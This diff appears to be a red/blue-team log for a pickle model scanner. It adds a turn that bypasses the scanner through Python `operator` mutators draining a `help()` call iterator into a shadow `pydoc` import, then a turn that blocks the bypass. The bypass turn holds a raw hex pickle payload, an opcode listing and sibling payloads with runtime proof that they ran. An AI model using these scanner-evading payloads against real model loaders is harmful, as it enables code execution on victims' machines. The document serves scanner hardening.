@@ -17759,3 +17759,253 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3818 passed, 1022 skipped, 21 warnings in 42.35s
 ```
+
+## Turn 269 - Bypass via public `operator` protocol mutators
+
+Offensive turn after the Turn 268 defense. The next source-level gap is public
+`operator` helpers that dispatch into mutating protocols. These helpers are not
+package-specific; they are thin wrappers around Python's data-model operations.
+Several of those operations consume an iterable argument or perform a mapping
+lookup, so they can trigger the same hidden `builtins.help()` path without the
+scanner recording the inner call.
+
+Smallest representative:
+
+```python
+operator.iadd([], iter(builtins.help, "stop"))
+```
+
+`operator.iadd(lhs, rhs)` calls the in-place add protocol. For a list receiver,
+that is equivalent to `list.extend(rhs)`, so a call iterator on `rhs` is drained
+during `pickle.loads`. The first `help()` call imports `pydoc`; a shadow
+`pydoc.py` on `sys.path` executes before returning an iterable value.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086f70657261746f728c0469616464935d680086522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+62: STACK_GLOBAL operator.iadd
+63: EMPTY_LIST
+64: BINGET 0            # call iterator
+66: TUPLE2
+67: REDUCE              # operator.iadd([], call_iterator), drains rhs
+68: STOP
+```
+
+Scanner proof:
+
+```text
+payload_len 69
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18, False),
+  ('builtins', 'help', 35, False),
+  ('operator', 'iadd', 62, False),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('operator', 'iadd', 2, 67),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type list
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-operator-iadd
+```
+
+Sibling probes from the same source family:
+
+```text
+operator.iconcat([], iter(help, "stop"))
+payload_len 72
+scan clean findings 0 errors ()
+invocations [('builtins', 'iter', 2, 43), ('operator', 'iconcat', 2, 70)]
+runtime_type list
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-operator-iconcat
+
+operator.ior({}, iter(help, "stop"))
+payload_len 68
+scan clean findings 0 errors ()
+invocations [('builtins', 'iter', 2, 43), ('operator', 'ior', 2, 66)]
+runtime_type dict
+runtime_repr {'owned-key': 'owned-value'}
+marker_exists True
+marker_text owned-by-operator-ior
+
+operator.setitem([], slice(None), iter(help, "stop"))
+payload_len 97
+scan clean findings 0 errors ()
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'slice', 1, 66),
+  ('operator', 'setitem', 3, 95),
+]
+runtime_type NoneType
+runtime_repr None
+marker_exists True
+marker_text owned-by-operator-setitem-slice
+
+operator.imod("%(x)s", collections.defaultdict(help))
+payload_len 80
+scan clean findings 0 errors ()
+invocations [
+  ('collections', 'defaultdict', 1, 47),
+  ('operator', 'imod', 2, 78),
+]
+runtime_type str
+runtime_repr 'factory-value'
+marker_exists True
+marker_text owned-by-operator-imod
+```
+
+Why it bypasses:
+
+- Turn 268 modeled `operator.contains`, `operator.countOf`, and
+  `operator.indexOf` because sequence search consumes argument 0.
+- Public `operator.iadd`, `operator.iconcat`, and `operator.ior` are still
+  clean and are not in the call-iterator consumption tables.
+- `operator.setitem` with a slice key dispatches to slice assignment; list slice
+  assignment consumes the replacement iterable.
+- Turn 242 modeled percent-format mapping lookup for `operator.mod`, but
+  `operator.imod` reaches the same string-format path and remains unmodeled.
+- The scanner records only the outer public `operator` reducer invocation, so
+  the Python call graph never sees the hidden zero-argument `builtins.help()`
+  call.
+
+Simplification opportunity:
+
+- Treat these as one finite `operator` protocol-dispatch table instead of
+  adding more package/container-specific rules:
+  `iadd` and `iconcat` consume rhs for list-like receivers, `ior` consumes rhs
+  for dict receivers, `setitem` consumes the value for slice assignment, and
+  `imod` performs the same string mapping lookup as `mod`.
+- Keep the helper receiver-aware to avoid flagging non-consuming failures such
+  as numeric `iadd(int, call_iterator)`.
+
+Performance note:
+
+- The representative payload is 69 bytes.
+- Warm scan median over 1000 runs was `0.000052s`, p95 `0.000055s`, and max
+  `0.001871s`.
+
+## Turn 270 - Block public `operator` protocol mutators
+
+Defensive turn for the Turn 269 bypass. The fix stays at the protocol source:
+public `operator` helpers are modeled as wrappers over Python data-model
+operations when the receiver shape proves that the operation consumes an
+iterable or performs a mapping lookup.
+
+Focused change:
+
+```text
+operator.iadd(list_receiver, call_iterator) -> list in-place add drains rhs
+operator.iconcat(list_receiver, call_iterator) -> list concat drains rhs
+operator.ior(dict_receiver, call_iterator) -> dict union-update drains rhs
+operator.setitem(list_receiver, slice, call_iterator) -> slice assignment drains value
+operator.imod(format_string, defaultdict) -> percent-format mapping lookup
+```
+
+Boundary kept:
+
+```text
+operator.iadd(int_receiver, call_iterator) -> TypeError without advancing rhs
+```
+
+Post-fix proof for the Turn 269 representative payload:
+
+```text
+payload_len 69
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('operator', 'iadd', 62),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('operator', 'iadd', 2, 67),
+  ('builtins', 'help', 0, 67),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+runtime_rc 0
+runtime_type list
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-operator-iadd
+runtime_stderr
+```
+
+Regression coverage:
+
+- `operator.iadd([], iter(help, "stop"))` is now malicious and runtime-proven
+  to execute the marker.
+- `operator.iconcat([], iter(help, "stop"))` is now malicious and
+  runtime-proven to execute the marker.
+- `operator.ior({}, iter(help, "stop"))` is now malicious and runtime-proven to
+  execute the marker.
+- `operator.setitem([], slice(None), iter(help, "stop"))` is now malicious and
+  runtime-proven to execute the marker.
+- `operator.imod("%(x)s", defaultdict(help))` now shares the existing
+  percent-format mapping lookup defense with `operator.mod`.
+- `operator.iadd(1, iter(help, "stop"))` remains clean and runtime-proven to
+  raise `TypeError` without executing the marker.
+
+Simplification note:
+
+- This avoids adding more container descriptor names for the same behavior.
+  Public `operator` protocol helpers are handled in one receiver-aware table.
+- The `imod` change reuses the existing `operator.mod` source-level mapping
+  lookup helper instead of introducing a second percent-format path.
+- The hot path remains exact-name dispatch over already-extracted reducer
+  arguments; receiver checks are primitive/constructed built-in type checks.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000121s`, p95
+  `0.000133s`, max `0.000208s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted operator protocol and percent-format regressions
+7 passed in 0.58s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+109 passed in 3.23s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+147 passed in 5.26s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3824 passed, 1022 skipped, 21 warnings in 46.86s
+```
